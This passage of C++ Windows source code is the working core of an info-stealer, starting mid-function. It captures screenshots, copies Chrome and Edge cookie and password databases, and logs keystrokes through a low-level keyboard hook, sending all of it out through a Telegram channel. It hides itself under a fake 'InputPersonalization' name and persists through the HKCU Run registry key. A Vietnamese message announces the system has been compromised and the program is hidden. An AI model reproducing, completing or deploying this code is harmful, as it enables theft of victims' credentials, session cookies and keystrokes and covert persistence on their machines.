    if (w <= 0 || h <= 0) { GdiplusShutdown(token); return; }

    HDC screen = GetDC(NULL);
    HDC mem = CreateCompatibleDC(screen);
    HBITMAP bmp = CreateCompatibleBitmap(screen, w, h);
    HGDIOBJ old = SelectObject(mem, bmp);
    BitBlt(mem, 0, 0, w, h, screen, x, y, SRCCOPY);

    wchar_t tmp[MAX_PATH] = {0};
    GetTempPathW(MAX_PATH, tmp);
    std::wstring outPath = std::wstring(tmp) + L"screen.jpg";

    CLSID clsid{};
    if (GetEncoderClsid(L"image/jpeg", &clsid) >= 0) {
        Bitmap bitmap(bmp, NULL);
        bitmap.Save(outPath.c_str(), &clsid, NULL);
    }

    SelectObject(mem, old);
    DeleteObject(bmp);
    DeleteDC(mem);
    ReleaseDC(NULL, screen);
    GdiplusShutdown(token);

    std::vector<char> data;
    if (ReadFileBytes(outPath, data)) SendBytesToTelegram(data, L"screen.jpg");
    DeleteFileW(outPath.c_str());
}

// ---------------------------------------------------------------------------
// Raw browser DB fallback (only if ABE dump fails)
// ---------------------------------------------------------------------------
static void StealBrowserData() {
    wchar_t appData[MAX_PATH] = {0};
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData))) return;

    struct Item { std::wstring path; std::wstring name; };
    std::vector<Item> items = {
        { std::wstring(appData) + L"\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", L"Chrome_Cookies.db" },
        { std::wstring(appData) + L"\\Google\\Chrome\\User Data\\Default\\Login Data",        L"Chrome_Passwords.db" },
        { std::wstring(appData) + L"\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies", L"Edge_Cookies.db" },
        { std::wstring(appData) + L"\\Microsoft\\Edge\\User Data\\Default\\Login Data",        L"Edge_Passwords.db" },
    };

    for (const auto& it : items) {
        if (GetFileAttributesW(it.path.c_str()) == INVALID_FILE_ATTRIBUTES) continue;
        std::vector<char> data;
        if (ReadFileBytes(it.path, data)) SendBytesToTelegram(data, it.name);
    }
}

// ---------------------------------------------------------------------------
// Keylogger (in-memory buffer; no file race between hook and sender)
// ---------------------------------------------------------------------------
static CRITICAL_SECTION g_logCs;
static std::string g_logBuf;
static HHOOK g_hook = NULL;

static std::string VkToText(DWORD vk, bool shift, bool caps) {
    switch (vk) {
        case VK_RETURN:  return "\n";
        case VK_SPACE:   return " ";
        case VK_TAB:     return "\t";
        case VK_BACK:    return "[BKSP]";
        case VK_ESCAPE:  return "[ESC]";
        case VK_DELETE:  return "[DEL]";
        case VK_LEFT:    return "[LEFT]";
        case VK_RIGHT:   return "[RIGHT]";
        case VK_UP:      return "[UP]";
        case VK_DOWN:    return "[DOWN]";
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
        case VK_MENU: case VK_LMENU: case VK_RMENU:
        case VK_LWIN: case VK_RWIN:
            return "";
        default: break;
    }

    if (vk >= 'A' && vk <= 'Z') {
        char c = (char)('a' + (vk - 'A'));
        bool upper = shift ^ caps;
        if (upper) c = (char)(c - 'a' + 'A');
        return std::string(1, c);
    }
    if (vk >= '0' && vk <= '9') {
        static const char* shifted = ")!@#$%^&*(";
        char c = shift ? shifted[vk - '0'] : (char)vk;
        return std::string(1, c);
    }
    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) {
        return std::string(1, (char)('0' + (vk - VK_NUMPAD0)));
    }

    switch (vk) {
        case VK_OEM_1:      return shift ? ":" : ";";
        case VK_OEM_PLUS:   return shift ? "+" : "=";
        case VK_OEM_COMMA:  return shift ? "<" : ",";
        case VK_OEM_MINUS:  return shift ? "_" : "-";
        case VK_OEM_PERIOD: return shift ? ">" : ".";
        case VK_OEM_2:      return shift ? "?" : "/";
        case VK_OEM_3:      return shift ? "~" : "`";
        case VK_OEM_4:      return shift ? "{" : "[";
        case VK_OEM_5:      return shift ? "|" : "\\";
        case VK_OEM_6:      return shift ? "}" : "]";
        case VK_OEM_7:      return shift ? "\"" : "'";
        default: break;
    }
    return "";
}

static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        bool caps  = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        std::string t = VkToText(kb->vkCode, shift, caps);
        if (!t.empty()) {
            EnterCriticalSection(&g_logCs);
            g_logBuf += t;
            if (g_logBuf.size() > (256 * 1024)) {
                g_logBuf.erase(0, g_logBuf.size() - (128 * 1024));
            }
            LeaveCriticalSection(&g_logCs);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

static DWORD WINAPI SendKeylogThread(LPVOID) {
    while (true) {
        Sleep(30000);
        std::string chunk;
        EnterCriticalSection(&g_logCs);
        if (!g_logBuf.empty()) chunk.swap(g_logBuf);
        LeaveCriticalSection(&g_logCs);

        if (chunk.empty()) continue;
        std::vector<char> data(chunk.begin(), chunk.end());
        SendBytesToTelegram(data, L"keylog.txt");
    }
    return 0;
}

static void StartKeylogger() {
    InitializeCriticalSection(&g_logCs);
    CreateThread(NULL, 0, SendKeylogThread, NULL, 0, NULL);
    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
}

// ---------------------------------------------------------------------------
// Background worker: screenshot + ABE dump (keylogger runs on main thread)
// ---------------------------------------------------------------------------
static DWORD WINAPI WorkerThread(LPVOID) {
    DebugLog("worker: start");
    SendTextToTelegram(L"Hệ thống đã bị xâm nhập! Đã ẩn mình thành công.");
    DebugLog("worker: text sent");
    TakeScreenshot();
    DebugLog("worker: screenshot done");
    bool abeOk = RunAbeDump();
    DebugLog(abeOk ? "worker: abe ok" : "worker: abe failed");
    if (!abeOk) {
        StealBrowserData();
        DebugLog("worker: raw db fallback done");
    }
    DebugLog("worker: end");
    return 0;
}

// ---------------------------------------------------------------------------
// Entry
// ---------------------------------------------------------------------------
int main() {
    // 1. Single instance (Local\ avoids the admin-only Global\ namespace).
    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Local\\WindowsInputPersonalizationMutex");
    if (hMutex && GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    // 2. Self-copy into %APPDATA% and persist via HKCU Run.
    wchar_t appData[MAX_PATH] = {0};
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData);
    std::wstring hiddenDir  = std::wstring(appData) + L"\\Microsoft\\InputPersonalization";
    std::wstring hiddenPath = hiddenDir + L"\\InputPersonalization.exe";
    CreateDirectoryW(hiddenDir.c_str(), NULL);

    wchar_t currentPath[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, currentPath, MAX_PATH);

    if (_wcsicmp(currentPath, hiddenPath.c_str()) != 0) {
        if (CopyFileW(currentPath, hiddenPath.c_str(), FALSE)) {
            SetFileAttributesW(hiddenPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

            HKEY hKey = NULL;
            if (RegOpenKeyExW(HKEY_CURRENT_USER,
                              L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                              0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                RegSetValueExW(hKey, L"WindowsInputPersonalization", 0, REG_SZ,
                               (const BYTE*)hiddenPath.c_str(),
                               (DWORD)((hiddenPath.length() + 1) * sizeof(wchar_t)));
                RegCloseKey(hKey);
            }
            ShellExecuteW(NULL, L"open", hiddenPath.c_str(), NULL, NULL, SW_HIDE);
            return 0;
        }
    }

    // 3. Keylogger first (hook + message loop on the main thread).
    //    Screenshot + ABE dump run in a worker thread in parallel.
    DebugLog("main: starting keylogger + worker");
    CreateThread(NULL, 0, WorkerThread, NULL, 0, NULL);
    StartKeylogger();

    return 0;
}
